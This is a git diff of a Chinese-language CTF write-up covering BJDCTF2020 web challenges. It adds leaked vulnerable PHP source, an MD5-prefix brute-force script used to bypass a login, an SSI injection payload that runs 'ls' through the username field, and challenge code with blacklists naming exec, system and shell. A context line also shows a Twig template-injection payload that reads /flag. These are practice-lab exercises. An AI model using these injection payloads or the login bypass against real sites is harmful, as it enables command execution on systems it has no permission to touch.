@@ -34,7 +34,7 @@ http://ec1c5bb6-221c-4577-8d10-0bc84cb670d0.node3.buuoj.cn/levels91.php?a[]=1&b[
 param1[]=1&param2[]=2
 ```
 
-## [BJDCTF2020]Mark loves cat
+# [BJDCTF2020]Mark loves cat
 
 首先查看网页源代码在网页最下方发现了dog，尝试以get请求拼接，无果，额只能目录扫描看看有啥可利用的了
 
@@ -235,8 +235,164 @@ Connection: close
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
 ```
 
+# [BJDCTF2020]EasySearch
+
+一个简简单单的搜索框，之后我发现存在源码泄露`index.php.swp`
+
+```
+<?php
+	ob_start();
+	function get_hash(){
+		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
+		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
+		$content = uniqid().$random;
+		return sha1($content); 
+	}
+    header("Content-Type: text/html;charset=utf-8");
+	***
+    if(isset($_POST['username']) and $_POST['username'] != '' )
+    {
+        $admin = '6d0bc1';
+        if ( $admin == substr(md5($_POST['password']),0,6)) {
+            echo "<script>alert('[+] Welcome to manage system')</script>";
+            $file_shtml = "public/".get_hash().".shtml";
+            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
+            $text = '
+            ***
+            ***
+            <h1>Hello,'.$_POST['username'].'</h1>
+            ***
+			***';
+            fwrite($shtml,$text);
+            fclose($shtml);
+            ***
+			echo "[!] Header  error ...";
+        } else {
+            echo "<script>alert('[!] Failed')</script>";
+            
+    }else
+    {
+	***
+    }
+	***
+?>
+```
+
+首先通过爆破实现登录
+
+```
+<?php
+for ($i=0;$i<10000000;$i++){
+    if('6d0bc1'==substr(md5($i),0,6)){
+        echo $i.PHP_EOL;
+    }
+}
+Result:
+2020666
+2305004
+9162671
+```
+
+登陆后的那个是个错误页面，一直懵圈很久，最后看网上提示说用Burp，再响应头当中发现关键地址
+
+```http
+HTTP/1.1 200 OK
+Server: openresty
+Date: Mon, 11 Jan 2021 11:52:43 GMT
+Content-Type: text/html;charset=utf-8
+Content-Length: 568
+Connection: close
+Url_is_here: public/d37fcb5c827625351e2795660b4c5e4e454b8df6.shtml
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.1.27
+```
+
+之后访问，抓包修改发现下面两个都无法导致页面Client-IP的变更
+
+```
+client-ip:127.0.0.1
+x-forwarded-for:127.0.0.1
+```
+
+最后看wp才知道原来是ssi,规定后缀为.shtml,在登陆界面,将username改掉改为这个
+
+```
+username=<!--#exec cmd="ls ../"-->
+```
+
+之后即可得到flag地址，之后也就是常规的RCE操作了无过滤就不写了
+
+# [BJDCTF2020]EzPHP
+
+打开环境在网页源代码中发现
+
+```
+<!-- Here is the real page =w= -->
+<!-- GFXEIM3YFZYGQ4A= -->
+全是大写猜测是base32编码
+解码后1nD3x.php才是真正的地址
+```
+
+打开后啊这看着就烦，这么长一串，先去跑个步再回来做
+
+```
+<?php
+highlight_file(__FILE__);
+error_reporting(0); 
+
+$file = "1nD3x.php";
+$shana = $_GET['shana'];
+$passwd = $_GET['passwd'];
+$arg = '';
+$code = '';
+
+echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";
+
+if($_SERVER) { 
+    if (
+        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
+        )  
+        die('You seem to want to do something bad?'); 
+}
+
+if (!preg_match('/http|https/i', $_GET['file'])) {
+    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
+        $file = $_GET["file"]; 
+        echo "Neeeeee! Good Job!<br>";
+    } 
+} else die('fxck you! What do you want to do ?!');
+
+if($_REQUEST) { 
+    foreach($_REQUEST as $value) { 
+        if(preg_match('/[a-zA-Z]/i', $value))  
+            die('fxck you! I hate English!'); 
+    } 
+} 
+
+if (file_get_contents($file) !== 'debu_debu_aqua')
+    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
 
 
-# 仓库地址
+if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
+    extract($_GET["flag"]);
+    echo "Very good! you know my password. But what is flag?<br>";
+} else{
+    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
+}
 
-https://github.com/BjdsecCA/BJDCTF2020仓库地址，有空复现以下题目
+if(preg_match('/^[a-z0-9]*$/isD', $code) || 
+preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
+    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
+} else { 
+    include "flag.php";
+    $code('', $arg); 
+} ?>
+```
+
+
+
+# Link Sharing
+
+[仓库地址，有空复现以下题目](https://github.com/BjdsecCA/BJDCTF2020)
+
+[SSI 注入的介绍和代码防御](https://blog.csdn.net/qq_29277155/article/details/52751364)
